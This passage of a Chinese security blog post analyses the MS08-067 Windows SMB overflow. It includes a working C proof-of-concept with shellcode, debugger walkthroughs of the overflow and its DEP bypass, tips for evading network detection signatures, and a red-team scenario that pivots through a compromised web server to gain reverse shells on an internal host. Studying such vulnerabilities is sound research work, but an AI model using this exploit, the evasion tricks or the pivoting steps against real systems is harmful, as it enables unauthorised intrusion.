+<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><h4 id="本地溢出调试"><a href="#本地溢出调试" class="headerlink" title="本地溢出调试"></a>本地溢出调试</h4><h5 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h5><p>本地溢出使用的poc为《0day安全》26.4.5章节中的<code>ms08-067_failwest.c</code>的基础上进行修改。</p>
+<p>修改了偏移量和<code>jmp esp</code>的地址。</p>
+<p>使用<code>Visual Studio 2019 Debug</code>版本编译后，偏移量发生了变化(112 =&gt; 109)，我们用来调试的目标操作系统与书中也发生了变化，所以要进行更新。</p>
+<p><strong>编译选项：</strong></p>
+<p>属性页-&gt;Debug-&gt;配置属性-&gt;</p>
+<ul>
+<li>常规-&gt;平台工具集：Visual Studio 2017 - Windows XP(v141_xp)</li>
+<li>C/C++-&gt;代码生成-&gt;运行库-&gt;多线程调试(/Mtd)</li>
+<li>链接器-&gt;高级-&gt;随机基址：否(方便调试，也可以不关闭)</li>
+</ul>
+<p><strong>关闭系统DEP</strong></p>
+<p>系统属性-&gt;高级-&gt;性能-&gt;设置-&gt;性能选项-&gt;数据执行保护。</p>
+<p><strong>源码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ms08-067_localoverflow.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(__stdcall* MYPROC)</span> <span class="params">(LPWSTR, LPWSTR, DWORD, LPWSTR, LPDWORD, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// address of jmp esp</span></span><br><span class="line"><span class="comment">//xp sp3 chinese</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JMP_ESP <span class="meta-string">"\xcd\x54\xfa\x7f\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELL_CODE \</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span> \</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span> \</span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span> \</span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span> \</span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span> \</span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span> \</span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span> \</span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span> \</span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span> \</span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span> \</span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span> \</span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x00\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR path[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR can_path[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD type = <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    HMODULE handle = LoadLibrary(<span class="string">L".\\netapi32.dll"</span>);</span><br><span class="line">    MYPROC Trigger = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == handle)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Fail to load library!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(handle, <span class="string">"NetpwPathCanonicalize"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == Trigger)</span><br><span class="line">    &#123;</span><br><span class="line">        FreeLibrary(handle);</span><br><span class="line">        wprintf(<span class="string">L"Fail to get api address!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//112 =&gt; 109</span></span><br><span class="line">    wcscpy(path, <span class="string">L"\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"</span>);</span><br><span class="line">    wcscat(path, (<span class="keyword">const</span> <span class="keyword">wchar_t</span>*)JMP_ESP);</span><br><span class="line">    wcscat(path, (<span class="keyword">const</span> <span class="keyword">wchar_t</span>*)SHELL_CODE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    type = <span class="number">1000</span>;</span><br><span class="line">    wprintf(<span class="string">L"BEFORE: %s\n"</span>, path);</span><br><span class="line">    retval = (Trigger)(path, can_path, <span class="number">1000</span>, <span class="literal">NULL</span>, &amp;type, <span class="number">1</span>);</span><br><span class="line">    wprintf(<span class="string">L"AFTER : %s\n"</span>, can_path);</span><br><span class="line">    wprintf(<span class="string">L"RETVAL: %s(0x%X)\n\n"</span>, retval ? <span class="string">L"FAIL"</span> : <span class="string">L"SUCCESS"</span>, retval);</span><br><span class="line">    FreeLibrary(handle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译后执行，可以看到成功执行了弹窗。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103165152-186404.png" alt="1635929511800"></p>
+<h5 id="动态分析溢出流程"><a href="#动态分析溢出流程" class="headerlink" title="动态分析溢出流程"></a>动态分析溢出流程</h5><p>接下来使用ollydbg进行动态调试，定位到溢出点。</p>
+<p>定位到main函数中调用<code>NetpwPathCanonicalize</code>函数调用的位置，分析参数可以看到攻击流量由<code>path</code>参数传入，prefix参数为空。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103171304-801052.png" alt="1635930784051"></p>
+<p>跟进NetpwPathCanonicalize中定位到CanonicalizePathName调用位置。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103172155-793380.png" alt="1635931314465"></p>
+<p>在CanonicalizePathName函数中，当传入的<code>prefix</code>参数为空时，不执行对<code>prefix</code>参数的长度判断，直接判断<code>Path</code>参数的长度是否符合要求 <code>pwchPrefixSize &lt;=pwchPathSize + pwchPrefixSize &lt;= 0x207</code></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103173822-184371.png" alt="1635932300984"></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103174023-634396.png" alt="1635932422840"></p>
+<p>判断完后拼接到路径缓冲区中。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103174543-967812.png" alt="1635932742303"></p>
+<p>然后进行替换<code>/</code>为<code>\</code>，检查DOS路径，移除经典路径的操作。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103174814-219446.png" alt="1635932893311"></p>
+<p>跟进移除经典路径函数<code>0x5FDDA220</code>中，判断首字符为<code>\</code>进行跳转。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103175137-259964.png" alt="1635933096583"></p>
+<p>判断第二个字符是否是<code>\</code>或者<code>/</code>，不相等则进行跳转。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103175918-2187.png" alt="1635933557247"></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103175620-132935.png" alt="1635933379817"></p>
+<p>接着向后查找经典路径，判断是否为经典路径<code>\..\</code>，符合条件进行copy，此时第一次copy时src在范围内，不会产生溢出。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103180226-649234.png" alt="1635933746088"></p>
+<p>向后执行，向前遍历上一个<code>\</code>的位置，<strong>此处的越界检查是无效的是导致溢出的直接原因</strong></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103212154-368918.png" alt="1635945714067"></p>
+<p>这里直接F4跳出循环，此时eax指向了0x12F332，也就是<code>\netapi32.dll</code>字符串，该字符串由Loadlibrary函数执行后产生(使用Visual Studio 2019 Debug编译的程序，在windows xp sp3系统中执行)。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103180455-766422.png" alt="1635933894776"></p>
+<p>向上遍历到后，更新到p3指针中，继续跳转到向后遍历寻找字符<code>.</code>，判断是否是经典路径<code>/../</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103213342-873404.png" alt="1635946421381"></p>
+<p>判断完成后，进行copy，可以看到此时p3指向的目标地址<code>0x12332</code>，已经超出了当前的栈顶<code>0x12F3FC</code>，所以在copy以后会覆盖栈顶及返回地址，测量与返回地址的偏移，去构造就可以控制eip。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103222013-989172.png" alt="1635949212584"></p>
+<p>进入函数wcscpy中，可以测算拷贝的目标地址与返回地址之间的偏移为<code>0x12F3F8 - 0x12F332 =  0xC6 = 198</code>，因为是unicode字符串，所以要把填充的字符数量根据偏移除以2，为99，所以最终需要填充的字符数量为99个。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103222539-102906.png" alt="1635949538621"></p>
+<p>继续执行，在本地测试中关掉了系统DEP保护，所以这里直接用了<code>jmp esp</code>跳板的地址来跳转到栈上执行shellcode。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103224222-201412.png" alt="1635950541678"></p>
+<h5 id="内存布局分析"><a href="#内存布局分析" class="headerlink" title="内存布局分析"></a>内存布局分析</h5><p>poc使用的攻击数据布局如下。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103231014-843614.png" alt="1635952214068"></p>
+<h5 id="字符产生的原因"><a href="#字符产生的原因" class="headerlink" title="\字符产生的原因"></a><code>\</code>字符产生的原因</h5><p>在数据窗口定位到前面匹配到的<code>\</code>在内存中的位置<code>0x12F332</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103225653-764282.png" alt="1635951412876"></p>
+<p>执行过Loadlibrary后，其位置写入了<code>/netapi32.dll</code>字符串。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103225437-473964.png" alt="1635951276234"></p>
+<h4 id="远程溢出调试"><a href="#远程溢出调试" class="headerlink" title="远程溢出调试"></a>远程溢出调试</h4><h5 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h5><p>查看netsvcs服务(提供SMB服务的svchost进程)进程ID。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where caption=&quot;svchost.exe&quot; get caption,handle,commandline</span><br></pre></td></tr></table></figure>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103233351-835519.png" alt="1635953630856"></p>
+<p>用OD附加该进程，在<code>netapi32.dll</code>中的<code>NetpwPathCanonicalize</code>上下断点，右键查看所有模块中的名称。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103234345-498771.png" alt="1635954224921"></p>
+<p>跟进函数在头部下断点，按F9键运行。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103234645-971143.png" alt="-1635954404915"></p>
+<p>在Metasploit中使用ms08-067漏洞进行攻击。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103235206-811247.png" alt="1635954725998"></p>
+<p>靶机在接收到远程RPC调用<code>NetpwPathCanonicalize</code>的攻击流量后，会在设置的断点处断下，接下来就可以进行动态调试了。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211103235614-258528.png" alt="1635954973455"></p>
+<p>在此处建立虚拟机快照，方便后续调试！</p>
+<h5 id="动态分析溢出流程-1"><a href="#动态分析溢出流程-1" class="headerlink" title="动态分析溢出流程"></a>动态分析溢出流程</h5><p>对传入的参数进行分析，查看其与本地溢出有什么不同。</p>
+<p>同样是在<code>path</code>参数中传递攻击数据，不过其设置了<code>prefix</code>为<code>\</code>，设置<code>can_path</code>缓冲区的大小为674。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104001137-114344.png" alt="1635955896206"></p>
+<p>动态执行的流程和前面几乎是一样的，之前已经分析过了，在这里我们主要关注以下三点。</p>
+<ol>
+<li>如何产生<code>\</code>字符的。</li>
+<li>溢出后突破DEP到执行到shellcode的流程。</li>
+<li>攻击数据布局。</li>
+</ol>
+<h5 id="字符产生的原因-1"><a href="#字符产生的原因-1" class="headerlink" title="\字符产生的原因"></a><code>\</code>字符产生的原因</h5><p>定位到第二次执行的位置<code>wcscpy</code></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104091513-906627.png" alt="1635988512781"></p>
+<p>在内存中窗口定位到<code>\</code>的位置，恢复快照(因为有ASLR，栈地址下次攻击流量再打过来就变了)，对<code>0x1B4F444</code>的<code>\</code>的位置下内存写入断点，在此处断下，此时并不能看到是哪条指令对其写入了<code>\</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104093336-25595.png" alt="1635989616178"></p>
+<p>再次恢复快照，按F4执行到<code>0x7C933C90</code>处，逐行执行，发现是在<code>7C933C9F    E8 F1D5FEFF     call ntdll.RtlInitUnicodeString</code>处写入了数据。</p>
+<p>再次恢复快照跟进函数中，重复流程，最终在函数内定位到写入<code>\</code>的位置。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104094010-379505.png" alt="1635990009682"></p>
+<p>进行栈回溯分析，查看是什么原因导致了该处指令，向0x1B4F444写入0x5C字符。</p>
+<p><strong>0x5C字符产生的原因</strong></p>
+<p>经过分析，发现写入的0x5C是其传入的unicode字符串的长度 * 2 + 2的值。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104100114-95241.png" alt="1635991273134"></p>
+<p>接着向上进行栈回溯分析，查看调用点在哪里，用于计算长度产生<code>\</code>的字符串是属于<code>Path</code>参数中的，所以几乎可以断定，这里的<code>\</code>是通过构造攻击包而产生的，一定在<code>NetpwPathCanonicalize</code>的调用范围内。</p>
+<p>第一层</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104111503-546025.png" alt="1635995702679"></p>
+<p>第二层</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104111542-871025.png" alt="1635995741870"></p>
+<p>第三层，可以看到来到了<code>CanonicalizePathName</code>函数中的位置，产生<code>\</code>的原因在<code>CheckDosPathType</code>这个API之中。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104111653-714820.png" alt="1635995813071"></p>
+<p>搞清楚了调用关系，现在可以用ida来正向分析流程，来判断攻击包里是什么触发导致了其写入<code>\</code>的原因了。</p>
+<p>跟进<code>CheckDosPathType</code>函数中，跟踪参数eax的值。</p>
+<p>跟进<code>ntdll.RtlIsDosDeviceName_U@4</code>函数中，发现函数内部也没有进行其他处理，跟进该函数内调用的<code>_RtlIsDosDeviceName_Ustr</code>函数中。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104113207-592590.png" alt="1635996726628"></p>
+<p>在<code>RtlIsDosDeviceName_Ustr</code>函数中，</p>
+<p>发现其从后向前遍历路径字符串，寻找倒数第一个<code>\</code>，<code>/</code>，<code>:</code> 字符。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104114916-605414.png" alt="1635997755472"></p>
+<p>然后判断其后面的第一个字符是否是<code>l</code>，<code>c</code>，<code>p</code>，<code>a</code>的任意一个(这里会将大写转换为小写)，符合条件才会调用<code>RtlInitUnicodeString</code>函数，其unicode字符串的长度 * 2 符合0x5E才能写入<code>\</code>。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104115455-347635.png" alt="1635998094944"></p>
+<p>因为函数的栈是向上生长的，写入<code>\</code>处的调用链为<code>CanonicalizePathName-&gt;CheckDosPathType-&gt;ntdll.RtlIsDosDeviceName_U@4-&gt;ntdll._RtlIsDosDeviceName_Ustr-&gt;RtlIsDosDeviceName_Ustr-&gt;ntdll.RtlInitUnicodeString</code>。</p>
+<p>而溢出函数wscpy的调用链为<code>CanonicalizePathName-&gt;RemoveLegacyFolder-&gt;wcscpy</code>，所以wcscpy的返回地址在栈中的位置，必定在写入<code>\</code>位置的下面，所以就会导致了可以测算偏移，来构造填充可以精确的覆盖到返回地址。</p>
+<h5 id="突破DEP"><a href="#突破DEP" class="headerlink" title="突破DEP"></a>突破DEP</h5><p>这里主要分析溢出后执行的路径，观察其是如何关掉DEP保护的。</p>
+<p>在wscpy执行后，覆盖到返回地址的值为<code>0x58FC17C2</code>，执行跟进，发现其是利用<code>NtSetInformationProcess</code>来关闭DEP保护的，而eax指向的地址存储着20408的值，该地址在所有版本的操作系统中都是一段可读写的空间。<code>NtSetInformationProcess</code>执行时需要传入这类的空间。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104122359-81699.png" alt="1635999839129"></p>
+<p>执行到返回后，跳转到<code>0x58F807</code>这里是内平栈，所以其后紧跟的4个字节为填充，跳转到了call esi的位置。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104122740-794329.png" alt="1636000060436"></p>
+<p>esi即p1指针一直为<code>\</code>后的位置，跳转过去后发现这里填充了一个jmp 指令，跳转到了shellcode，到这里执行流程完成。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104122940-598886.png" alt="1636000180132"></p>
+<h5 id="内存布局分析-1"><a href="#内存布局分析-1" class="headerlink" title="内存布局分析"></a>内存布局分析</h5><p>根据上述的调试过程来分析其攻击数据的内存布局。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211104123700-709037.png" alt="1636000619385"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://github.com/jionyeahgithub/Arbang/tree/master/%E7%BB%8F%E5%85%B8%E9%87%8D%E7%8E%B0ms08-067%E6%BC%8F%E6%B4%9E%E8%AF%A6%E5%B0%BD%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E8%BF%9B%E9%98%B6" target="_blank" rel="noopener">https://github.com/jionyeahgithub/Arbang/tree/master/%E7%BB%8F%E5%85%B8%E9%87%8D%E7%8E%B0ms08-067%E6%BC%8F%E6%B4%9E%E8%AF%A6%E5%B0%BD%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E8%BF%9B%E9%98%B6</a></p>
+<h2 id="三-思路拓展：流量侧绕过"><a href="#三-思路拓展：流量侧绕过" class="headerlink" title="(三)思路拓展：流量侧绕过"></a>(三)思路拓展：流量侧绕过</h2><h3 id="思路一：利用与漏洞产生原理变换绕过检测特征"><a href="#思路一：利用与漏洞产生原理变换绕过检测特征" class="headerlink" title="思路一：利用与漏洞产生原理变换绕过检测特征"></a>思路一：利用与漏洞产生原理变换绕过检测特征</h3><p>MS08-067的漏洞触发的条件之一是RPC的参数Path中存在路径穿越 <code>/../../</code>；此特征较明显，因此防御人员很可能通过此特征进行拦截。</p>
+<p>根据其在<code>CanonicalizePathName</code>函数中，会在调用<code>RemoveLegacyFolder</code>，自动将<code>/</code>替换为<code>\</code>的功能点，可以将其变换成如下形式，来绕过拦截。</p>
+<ul>
+<li><code>\../..\</code></li>
+<li><code>/../..\</code></li>
+<li><code>/..\..\</code></li>
+<li>…</li>
+</ul>
+<h3 id="思路二：流量请求测绕过"><a href="#思路二：流量请求测绕过" class="headerlink" title="思路二：流量请求测绕过"></a>思路二：流量请求测绕过</h3><ul>
+<li>利用SMB_COM_WRITE_ANX分割PRC流量检测特征(可以分段一个字节一个字节的发送RPC的数据)</li>
+<li>利用SMB_COM_TRANSACTION命令绕过检测</li>
+</ul>
+<p>参考系列文章：<a href="https://mp.weixin.qq.com/s/5jy2MWjDb3nuERNgDV_8Hw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5jy2MWjDb3nuERNgDV_8Hw</a></p>
+<p><strong>还可以通过调整布局的方式，来获取更大的shellcode空间。</strong></p>
+<h2 id="四-应用场景：针对内网目标"><a href="#四-应用场景：针对内网目标" class="headerlink" title="(四)应用场景：针对内网目标"></a>(四)应用场景：针对内网目标</h2><p>对于二进制漏洞的研究来说，不仅要知其原理，也要知道其使用场景，才能够更好的做武器化的开发。</p>
+<p>在红队攻击中，对于二进制RCE漏洞，很少在公网暴漏的目标能够成功，一般会用来攻击内网主机，把对方内网的机器，通过流量代理，代理到公网的机器上。</p>
+<h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211101224832-227597.png" alt="1635778110935"></p>
+<h3 id="场景描述"><a href="#场景描述" class="headerlink" title="场景描述"></a>场景描述</h3><p>在图中<strong>192.168.26.134</strong>是我们的攻击机。</p>
+<p>IP为<strong>192.168.26.128</strong>是目标暴漏在公网上的Web服务器，其内网地址为<strong>172.20.1.112</strong>。</p>
+<p>内网IP为<strong>192.168.52.143</strong>的内网数据库服务器，是我们想要进行攻击的目标。</p>
+<hr>
+<p>我们已经获取了Web服务器<strong>192.168.26.128</strong>的权限，继续向内网中渗透。</p>
+<p>但是攻击者的PC无法直接访问内网的数据库服务器<strong>172.20.1.123</strong>，web服务器可以直接访问数据库服务器，数据库服务器为英文版本的Windows 2003Server SP2系统，其445端口的SMB服务存在MS08-067漏洞。</p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>我们可以以Web服务器为跳板，将内网数据库服务器的445端口映射到Web服务器的1234端口，使用Metasploit对映射到的Web服务器1234端口发送MS08-067的攻击流量进行攻击。</p>
+<p>其攻击流量会由Web服务器的1234端口，转发到内网数据库服务器的445端口中去。</p>
+<p>攻击成功后，在Web服务器将内网数据库服务器反弹shell的流量转发到攻击机上。</p>
+<h3 id="具体实施"><a href="#具体实施" class="headerlink" title="具体实施"></a>具体实施</h3><p>这里我们使用lcx来进行流量转发，需要在我们已经拿下权限的Web服务器中上传lcx.exe</p>
+<h4 id="smb服务转发"><a href="#smb服务转发" class="headerlink" title="smb服务转发"></a>smb服务转发</h4><p>将内网数据库服务器的445端口映射到Web服务器上的1234端口，即监听端口1234，将所有发往<strong>192.168.26.128:1234</strong>的流量，转发到<strong>172.20.1.123:445</strong></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211101231541-873682.png" alt="1635779741322"></p>
+<h4 id="正反向shell转发"><a href="#正反向shell转发" class="headerlink" title="正反向shell转发"></a>正反向shell转发</h4><h5 id="single-payload-windows-shell-bind-tcp"><a href="#single-payload-windows-shell-bind-tcp" class="headerlink" title="single: payload/windows/shell_bind_tcp"></a>single: payload/windows/shell_bind_tcp</h5><p>设置msf的payload为windows/shell_bind_tcp，其监听端口为4444。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102092337-236263.png" alt="1635816216694"></p>
+<p>在Web服务器上，将内网数据库服务器的4444端口，映射到Web服务器的4444端口。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102003440-863051.png" alt="1635784479986"></p>
+<p>攻击成功后，将在内网数据库服务器上建立4444端口的监听，等待连接。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102092500-909738.png" alt="1635816299400"></p>
+<h5 id="single-payload-windows-shell-reverse-tcp"><a href="#single-payload-windows-shell-reverse-tcp" class="headerlink" title="single: payload/windows/shell_reverse_tcp"></a>single: payload/windows/shell_reverse_tcp</h5><p>设置msf的payload为windows/shell_reverse_tcp，其回连端口为4444，回连的ip为172.20.1.122。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102150006-826247.png" alt="1635836405546"></p>
+<p>在攻击机上用nc进行监听本地的4567端口，设置转发，将攻击机4567端口传输的数据，转发到Web服务器上。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151715-805679.png" alt="1635837434670"></p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151617-14983.png" alt="1635837376773"></p>
+<p>在Web服务器上设置转发，将来自4444端口的数据，转发到本机的4444端口。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102145903-434031.png" alt="1635836343223"></p>
+<p>进行攻击。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151632-338512.png" alt="1635837392252"></p>
+<p>反向shell连接成功。</p>
+<p><img src="http://flag0.oss-cn-qingdao.aliyuncs.com/flag0/20211102151556-880376.png" alt="1635837355678"></p>
+<h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/wuxinmengyi/p/11598876.html" target="_blank" rel="noopener">https://www.cnblogs.com/wuxinmengyi/p/11598876.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/Tpapq3YQy2WaQTUT5LyMhQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Tpapq3YQy2WaQTUT5LyMhQ</a></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/编程开发/">编程开发</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/Nday/">Nday</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://flag0.com/2021/11/26/漏洞考古：MS08067深入分析/" data-title="漏洞考古：MS08067深入分析 | flag0&#39;s Blog" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
